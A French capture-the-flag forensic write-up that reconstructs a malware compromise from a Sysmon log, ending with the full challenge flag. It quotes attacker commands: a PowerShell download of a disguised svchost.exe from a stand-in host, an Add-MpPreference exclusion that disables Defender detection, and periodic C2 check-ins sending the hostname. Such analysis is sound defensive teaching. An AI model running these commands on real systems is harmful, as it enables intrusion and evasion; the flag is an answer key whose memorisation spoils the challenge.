# Le beacon fatal (HacKagou 2026) — Forensic

Catégorie : Forensic — Points : ~94 (scoring dynamique) — Auteur : K3rhu0n
**Statut : ✅ résolu**

**Flag :** `OPENNC{C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe_149_leviathan-control.invalid_198.51.100.23}`

## Énoncé

Un malware a pris pied sur le système « chaufferie » du Nautile. Il faut retrouver
**tous les artefacts** de la compromission à partir d'un journal **Sysmon**
(`sysmon_beacon.log`, 650 lignes au format `clé=valeur`) :

1. Chemin complet du beacon
2. Numéro de la ligne visant à empêcher la détection du beacon
3. Nom de domaine du Command & Control (C2)
4. IP du C2

Format : `OPENNC{réponse1_réponse2_réponse3_réponse4}`

> Prérequis : le challenge n'apparaît qu'après avoir validé **La backdoor secrète** (#44).

## Reconnaissance

Le log mélange plusieurs `EventID` Sysmon :

```
$ grep -oE 'EventID=[0-9]+' sysmon_beacon.log | sort | uniq -c | sort -rn
    420 EventID=1      # Process Create
    115 EventID=3      # Network Connection
    113 EventID=22     # DNS Query
      1 EventID=11     # File Create
      1 EventID=5007   # Windows Defender — changement de configuration
```

Les deux événements uniques (11 et 5007) sautent aux yeux et donnent le fil à tirer.

## Exploitation

### 1. Chemin du beacon — `EventID=11` (File Create), ligne 121

```
L118  EventID=1  powershell.exe (parent = OUTLOOK.EXE)
      CommandLine: New-Item ... 'C:\Users\nautile01\AppData\Local\Lagoon' ;
      Invoke-WebRequest 'https://updates-nautile.example.invalid/telemetry/svchost.exe'
                        -OutFile 'C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe'
L121  EventID=11 TargetFilename=C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe
L136  EventID=1  Image=C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe  (exécution)
```

Chaîne d'infection classique : pièce jointe Outlook → PowerShell caché qui télécharge
un faux `svchost.exe` (masquerading) dans `AppData\Local\Lagoon`, puis l'exécute.

> **Réponse 1 :** `C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe`

### 2. Ligne anti-détection — `Add-MpPreference`, ligne 149

```
L149  EventID=1  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command
      "... Add-MpPreference -ExclusionProcess
           'C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe' ..."
L154  EventID=5007  Windows Defender  "ExclusionProcess added: ...\Lagoon\svchost.exe"
```

La ligne 149 est la **commande délibérée** qui exclut le beacon de Windows Defender
(technique MITRE **T1562.001 – Impair Defenses**). La ligne 154 n'est que le log
Defender confirmant le changement : « la ligne *visant à* empêcher la détection »
désigne donc l'action attaquant (149), pas sa conséquence journalisée (154).

> **Réponse 2 :** `149`

### 3 & 4. C2 (domaine + IP) — check-ins périodiques

Le beacon (processus `...\Lagoon\svchost.exe`) relance toutes les ~12 min un
PowerShell qui contacte le serveur de contrôle :

```
L198  EventID=1  (parent = ...\Lagoon\svchost.exe) powershell -Command
      "$r=Invoke-WebRequest https://leviathan-control.invalid/checkin?host=$env:COMPUTERNAME ..."
L199  EventID=22 QueryName=leviathan-control.invalid QueryStatus=0 QueryResults=198.51.100.23
L200  EventID=3  DestinationHostname=leviathan-control.invalid DestinationIp=198.51.100.23 DestinationPort=...
```

Répété aux lignes 278/279/280, 358/359/360, 438/…, 518/…, 598/600 (beaconing régulier).
À ne pas confondre avec `updates-nautile.example.invalid` (serveur de **livraison** du
dropper, ligne 118) : le **C2** est le serveur de **check-in**.

> **Réponse 3 :** `leviathan-control.invalid` — **Réponse 4 :** `198.51.100.23`

## Flag

```
OPENNC{C:\Users\nautile01\AppData\Local\Lagoon\svchost.exe_149_leviathan-control.invalid_198.51.100.23}
```
